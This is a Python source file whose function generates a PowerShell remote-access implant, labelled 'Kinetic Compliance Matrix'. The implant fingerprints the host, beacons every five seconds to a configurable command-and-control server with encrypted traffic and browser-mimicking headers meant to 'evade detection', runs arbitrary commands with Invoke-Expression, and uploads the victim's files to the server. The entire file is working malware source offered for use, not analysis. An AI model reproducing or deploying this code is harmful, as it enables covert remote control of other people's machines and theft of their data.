# core/utils/agent_generator.py
import base64
import os
import json

def generate_agent_code(key_base64, server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload"):
    """Generate PowerShell agent code with identity collection and custom paths"""
    # Ensure all paths have leading slashes
    if not beacon_path.startswith('/'):
        beacon_path = '/' + beacon_path
    if not cmd_result_path.startswith('/'):
        cmd_result_path = '/' + cmd_result_path
    if not file_upload_path.startswith('/'):
        file_upload_path = '/' + file_upload_path
        
    agent_code = f"""
# Kinetic Compliance Matrix - PowerShell Agent
# This agent contains encryption functionality and system identification

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Encryption key
$key = [System.Convert]::FromBase64String('{key_base64}')

# Server details
$serverAddress = '{server_address}'

# Endpoint paths - customized to evade detection
$beaconPath = '{beacon_path}'
$commandResultPath = '{cmd_result_path}'
$fileUploadPath = '{file_upload_path}'

# Function to encrypt data for C2 communication
function Encrypt-Data {{
    param([string]$PlainText)
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {{
        $paddedBytes[$i] = [byte]$paddingLength
    }}
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($result)
}}

# Function to decrypt data from C2 communication
function Decrypt-Data {{
    param([string]$EncryptedBase64)
    
    # Decode base64
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
    
    # Extract IV and ciphertext
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
    
    # Create AES decryptor
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    # Decrypt
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    
    # Remove padding
    $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
    $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
    
    # Convert to string
    return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
}}

# Function to gather system identification information
function Get-SystemIdentification {{
    # Gather system identification information
    $systemInfo = @{{
        Hostname = [System.Net.Dns]::GetHostName()
        Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        OsVersion = [System.Environment]::OSVersion.VersionString
        Architecture = if ([System.Environment]::Is64BitOperatingSystem) {{ "x64" }} else {{ "x86" }}
        ProcessorCount = [System.Environment]::ProcessorCount
        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    }}
    
    # Generate a unique client identifier (will be used later for re-registration)
    $clientId = [Guid]::NewGuid().ToString()
    $systemInfo.ClientId = $clientId
    
    # Get Machine GUID - this is a relatively stable identifier
    try {{
        $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
        $systemInfo.MachineGuid = $machineGuid
    }} catch {{
        $systemInfo.MachineGuid = "Unknown"
    }}
    
    # Get MAC address of first network adapter
    try {{
        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object {{ $_.IPAddress -ne $null }}
        if ($networkAdapters) {{
            $systemInfo.MacAddress = $networkAdapters[0].MACAddress
        }} else {{
            $systemInfo.MacAddress = "Unknown"
        }}
    }} catch {{
        $systemInfo.MacAddress = "Unknown"
    }}
    
    # Get domain information
    try {{
        $computerSystem = Get-CimInstance Win32_ComputerSystem
        $systemInfo.Domain = $computerSystem.Domain
        $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
    }} catch {{
        $systemInfo.Domain = "Unknown"
        $systemInfo.PartOfDomain = $false
    }}
    
    # Convert to JSON
    $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
    return $jsonInfo
}}

# Main agent loop
function Start-AgentLoop {{
    $beaconUrl = "http://$serverAddress$beaconPath"
    $commandResultUrl = "http://$serverAddress$commandResultPath"
    $uploadUrl = "http://$serverAddress$fileUploadPath"
    $beaconInterval = 5  # Seconds
    
    # Get system information for identification
    $systemInfo = Get-SystemIdentification
    
    while ($true) {{
        try {{
            # Create web client for C2 communication
            $webClient = New-Object System.Net.WebClient
            
            # Add system info in encrypted form
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            
            # Add client ID from system info if available
            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
            if ($systemInfoObj.ClientId) {{
                $webClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
            }}
            
            # Add legitimate-looking headers to blend in with normal web traffic
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
            
            # Beacon to the C2 server
            $encryptedResponse = $webClient.DownloadString($beaconUrl)
            
            # Decrypt and process response if not empty
            if ($encryptedResponse.Length -gt 0) {{
                $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
                $commands = ConvertFrom-Json -InputObject $decryptedResponse
                
                # Process each command
                foreach ($command in $commands) {{
                    $timestamp = $command.timestamp
                    $commandType = $command.command_type
                    $args = $command.args
                    
                    # Execute based on command type
                    try {{
                        $result = ""
                        
                        if ($commandType -eq "execute") {{
                            # Execute shell command
                            $result = Invoke-Expression -Command $args | Out-String
                        }}
                        elseif ($commandType -eq "upload") {{
                            # Upload file from client to server
                            if (Test-Path -Path $args) {{
                                $fileName = Split-Path -Path $args -Leaf
                                $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($args))
                                
                                $fileInfo = @{{
                                    FileName = $fileName
                                    FileContent = $fileContent
                                }}
                                
                                $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
                                $encryptedFileInfo = Encrypt-Data -PlainText $fileInfoJson
                                
                                $uploadClient = New-Object System.Net.WebClient
                                $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                                $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
                                $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
                                $uploadClient.Headers.Add("Content-Type", "application/json")
                                $uploadClient.UploadString($uploadUrl, $encryptedFileInfo)
                                
                                $result = "File uploaded: $fileName"
                            }} else {{
                                $result = "Error: File not found - $args"
                            }}
                        }}
                        elseif ($commandType -eq "system_info") {{
                            # Return detailed system information
                            $detailedInfo = Get-SystemIdentification
                            $result = $detailedInfo
                        }}
                        else {{
                            $result = "Unknown command type: $commandType"
                        }}
                        
                        # Send the result back to C2
                        $resultObj = @{{
                            timestamp = $timestamp
                            result = $result
                        }}
                        
                        $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                        $encryptedResult = Encrypt-Data -PlainText $resultJson
                        
                        $resultClient = New-Object System.Net.WebClient
                        $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                        $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
                        $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
                        $resultClient.Headers.Add("Content-Type", "application/json")
                        $resultClient.UploadString($commandResultUrl, $encryptedResult)
                    }}
                    catch {{
                        # Send the error as a result
                        $resultObj = @{{
                            timestamp = $timestamp
                            result = "Error executing command: $_"
                        }}
                        
                        $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                        $encryptedResult = Encrypt-Data -PlainText $resultJson
                        
                        $resultClient = New-Object System.Net.WebClient
                        $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                        $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
                        $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
                        $resultClient.Headers.Add("Content-Type", "application/json")
                        $resultClient.UploadString($commandResultUrl, $encryptedResult)
                    }}
                }}
            }}
        }}
        catch {{
            # Error in main loop - just continue and try again
            Start-Sleep -Seconds $beaconInterval
            continue
        }}
        
        # Wait for next beacon interval
        Start-Sleep -Seconds $beaconInterval
    }}
}}

# Start the agent
Start-AgentLoop
"""
    return agent_code